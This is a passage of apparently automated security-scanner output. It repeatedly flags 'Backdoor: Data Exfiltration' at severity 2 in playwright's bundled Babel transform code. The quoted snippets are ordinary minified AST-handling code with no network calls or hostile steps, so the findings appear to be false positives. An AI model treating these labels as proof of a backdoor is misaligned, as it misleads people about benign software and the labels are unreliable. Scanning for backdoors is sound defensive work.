                      "markdown": "`o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral(\"#\"+i.key.id.name);t(a,s,o)}},ClassAccessorProperty(n,s){let{node:i}=n,a=i.key,o=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(o))if(i.computed){let l=r(n,a,s);t(o,s,l)}else if(a.type===\"Identifier\")t(o,s,a.name);else if(a.type===\"PrivateName\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 5216,
                  "endLine": 1867,
                  "endColumn": 5221,
                  "snippet": {
                    "text": "n(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral",
                    "rendered": {
                      "text": "n(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral",
                      "markdown": "`n(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPrivateProperty(n,s){let{node:i}=n,a=(0,Ns.skipTransparentExprWrappers)(n.get(\"value\"));if(e(a)){let o=A.types.stringLiteral`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 5094,
                  "endLine": 1867,
                  "endColumn": 5099,
                  "snippet": {
                    "text": "s)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPr",
                    "rendered": {
                      "text": "s)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPr",
                      "markdown": "`s)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identifier\")t(l,s,o.name);else{let u=A.types.stringLiteral(o.value+\"\");t(l,s,u)}}}},ClassPr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 5009,
                  "endLine": 1867,
                  "endColumn": 5014,
                  "snippet": {
                    "text": "s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identi",
                    "rendered": {
                      "text": "s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identi",
                      "markdown": "`s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"properties\")){let{node:a}=i;if(a.type!==\"ObjectProperty\")continue;let o=a.key,l=(0,Ns.skipTransparentExprWrappers)(i.get(\"value\"));if(e(l)){if(a.computed){let u=r(i,o,s);t(l,s,u)}else if(!xEe(o))if(o.type===\"Identi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 4798,
                  "endLine": 1867,
                  "endColumn": 4803,
                  "snippet": {
                    "text": "),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"pro",
                    "rendered": {
                      "text": "),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"pro",
                      "markdown": "`),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a)){let o=i.name;t(a,s,o)}}},ObjectExpression(n,s){for(let i of n.get(\"pro`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 4638,
                  "endLine": 1867,
                  "endColumn": 4643,
                  "snippet": {
                    "text": "Literal(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if",
                    "rendered": {
                      "text": "Literal(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if",
                      "markdown": "`Literal(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"right\"));if(e(a))switch(n.node.operator){case\"=\":case\"&&=\":case\"||=\":case\"??=\":t(a,s,i.name)}}},AssignmentPattern(n,s){let i=n.node.left;if`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 4431,
                  "endLine": 1867,
                  "endColumn": 4436,
                  "snippet": {
                    "text": "n CEe(e,t){function r(n,s,i){switch(s.type){case\"StringLiteral\":return A.types.stringLiteral(s.value);case\"NumericLiteral\":case\"BigIntLiteral\":{let a=s.value+\"\";return n.get(\"key\").replaceWith(A.types.stringLiteral(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.t",
                    "rendered": {
                      "text": "n CEe(e,t){function r(n,s,i){switch(s.type){case\"StringLiteral\":return A.types.stringLiteral(s.value);case\"NumericLiteral\":case\"BigIntLiteral\":{let a=s.value+\"\";return n.get(\"key\").replaceWith(A.types.stringLiteral(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.t",
                      "markdown": "`n CEe(e,t){function r(n,s,i){switch(s.type){case\"StringLiteral\":return A.types.stringLiteral(s.value);case\"NumericLiteral\":case\"BigIntLiteral\":{let a=s.value+\"\";return n.get(\"key\").replaceWith(A.types.stringLiteral(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,Ns.skipTransparentExprWrappers)(n.get(\"init\"));if(e(a)){let o=i.name;t(a,s,o)}}},AssignmentExpression(n,s){let i=n.node.left;if(i.t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 4300,
                  "endLine": 1867,
                  "endColumn": 4305,
                  "snippet": {
                    "text": "rivateMethod\":case\"ClassPrivateProperty\":return Tl(e);default:return!1}}function AEe(e){return Tl(e)||e.body.body.some(PEe)}function CEe(e,t){function r(n,s,i){switch(s.type){case\"StringLiteral\":return A.types.stringLiteral(s.value);case\"NumericLiteral\":case\"BigIntLiteral\":{let a=s.value+\"\";return n.get(\"key\").replaceWith(A.types.stringLiteral(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,",
                    "rendered": {
                      "text": "rivateMethod\":case\"ClassPrivateProperty\":return Tl(e);default:return!1}}function AEe(e){return Tl(e)||e.body.body.some(PEe)}function CEe(e,t){function r(n,s,i){switch(s.type){case\"StringLiteral\":return A.types.stringLiteral(s.value);case\"NumericLiteral\":case\"BigIntLiteral\":{let a=s.value+\"\";return n.get(\"key\").replaceWith(A.types.stringLiteral(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,",
                      "markdown": "`rivateMethod\":case\"ClassPrivateProperty\":return Tl(e);default:return!1}}function AEe(e){return Tl(e)||e.body.body.some(PEe)}function CEe(e,t){function r(n,s,i){switch(s.type){case\"StringLiteral\":return A.types.stringLiteral(s.value);case\"NumericLiteral\":case\"BigIntLiteral\":{let a=s.value+\"\";return n.get(\"key\").replaceWith(A.types.stringLiteral(a)),A.types.stringLiteral(a)}default:{let a=n.scope.maybeGenerateMemoised(s);return n.get(\"key\").replaceWith(A.types.assignmentExpression(\"=\",a,IE(i,s))),A.types.cloneNode(a)}}}return{VariableDeclarator(n,s){let i=n.node.id;if(i.type===\"Identifier\"){let a=(0,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 789,
                  "endLine": 1867,
                  "endColumn": 794,
                  "snippet": {
                    "text": "[A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticBlock([]);Rs.body.body.unshift(Us);let pn=Us.body;if(pe.length>0){let oe=Ma.get(\"body.body\"),ee;for(let je of oe)if((je.isClassProperty()||je.isClassMethod())&&je.node.kind!==\"constructor\"){ee=je;break}ee!=null?(EEe(ee),vl(pe,ee)):(Rs.body.body.unshift(A.types.classProperty(A.types.sequenceExpression([...pe,A.types.stringLiteral(\"_\")]),void 0,void 0,void 0,!0,!0)),pn.push(A.typ",
                    "rendered": {
                      "text": "[A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticBlock([]);Rs.body.body.unshift(Us);let pn=Us.body;if(pe.length>0){let oe=Ma.get(\"body.body\"),ee;for(let je of oe)if((je.isClassProperty()||je.isClassMethod())&&je.node.kind!==\"constructor\"){ee=je;break}ee!=null?(EEe(ee),vl(pe,ee)):(Rs.body.body.unshift(A.types.classProperty(A.types.sequenceExpression([...pe,A.types.stringLiteral(\"_\")]),void 0,void 0,void 0,!0,!0)),pn.push(A.typ",
                      "markdown": "`[A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticBlock([]);Rs.body.body.unshift(Us);let pn=Us.body;if(pe.length>0){let oe=Ma.get(\"body.body\"),ee;for(let je of oe)if((je.isClassProperty()||je.isClassMethod())&&je.node.kind!==\"constructor\"){ee=je;break}ee!=null?(EEe(ee),vl(pe,ee)):(Rs.body.body.unshift(A.types.classProperty(A.types.sequenceExpression([...pe,A.types.stringLiteral(\"_\")]),void 0,void 0,void 0,!0,!0)),pn.push(A.typ`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 425,
                  "endLine": 1867,
                  "endColumn": 430,
                  "snippet": {
                    "text": "ewExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticBlock([]);Rs.bod",
                    "rendered": {
                      "text": "ewExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticBlock([]);Rs.bod",
                      "markdown": "`ewExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticBlock([]);Rs.bod`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 410,
                  "endLine": 1867,
                  "endColumn": 415,
                  "snippet": {
                    "text": "=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticB",
                    "rendered": {
                      "text": "=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticB",
                      "markdown": "`=[],M=A.types.newExpression(ee,[]);fe.length>0&&je.push(...fe),An&&(fn=!0,je.push(An)),je.length>0?(je.unshift(A.types.callExpression(A.types.super(),[A.types.cloneNode(Be)])),ee.body.body.push(JO(je,!1))):M.arguments.push(A.types.cloneNode(Be));let[$]=e.replaceWith(M);Ma=$.get(\"callee\").get(\"body\").get(\"body\")[0].get(\"key\")}}!fn&&An&&e.node.body.body.push(A.types.staticBlock([A.types.expressionStatement(An)]));let{superClass:Cn}=Rs;if(Cn&&(a===\"2023-11\"||a===\"2023-05\")){let oe=e.scope.maybeGenerateMemoised(Cn);oe&&(Rs.superClass=A.types.assignmentExpression(\"=\",oe,Cn),Cn=oe)}let Us=A.types.staticB`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1867,
                  "startColumn": 398,
                  "endLine": 1867,
                  "endColumn": 403,
                  "snippet": {
